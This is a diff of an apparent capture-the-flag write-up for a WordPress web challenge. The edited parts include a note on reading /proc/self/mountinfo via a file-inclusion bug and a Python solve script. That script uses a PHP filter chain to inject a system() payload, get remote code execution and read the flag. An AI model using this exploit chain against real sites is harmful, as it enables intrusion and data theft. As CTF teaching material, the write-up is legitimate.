@@ -365,7 +365,7 @@ get_flag()
 
 ### Bonus
 
-After looking at some solutions, people used /proc/self/mountinfo or /proc/self/mounts to view files. Of course this method only stops at the LFI bug and if the flag file is not located at root then it's difficult
+After looking at some solutions, many people used /proc/self/mountinfo or /proc/self/mounts to view files. Of course this method only stops at the LFI bug and if the flag file is not located at root then it's difficult
 
 ![image](https://hackmd.io/_uploads/S1AX4dgYgg.png)
 
@@ -1620,7 +1620,7 @@ $e = new SecureTableGenerator($d);
 
 From now, we can achieve RCE and leak information by writing it into the `wp-content/uploads` directory.
 
-![image](https://hackmd.io/_uploads/rkROcTNtee.png)
+![image](https://hackmd.io/_uploads/BypcsLHYll.png)
 
 
 Full solve script:
@@ -1677,8 +1677,9 @@ import requests
 import subprocess
 
 URL = "http://localhost/"
+# URL = "https://fancy-web-1vilerf2hxwh.chals.sekai.team/"
 
-payload = '<?php system("cat /flag* / > /var/www/html/wp-content/uploads/huhu.txt");?>'
+payload = '<?php system("cat /flag* / > /var/www/html/wp-content/uploads/hihi.txt");?>'
 
 res = subprocess.run(['python3', 'php_filter_chain_generator.py', '--chain', payload], capture_output=True, text=True)
 gadget = res.stdout.split('\n', 1)[1]
@@ -1694,7 +1695,7 @@ def trigger():
     r = requests.post(URL, data=data)
 
 def read_flag():
-    r = requests.get(URL + "wp-content/uploads/huhu.txt")
+    r = requests.get(URL + "wp-content/uploads/hihi.txt")
     print(r.text)
 
 trigger()
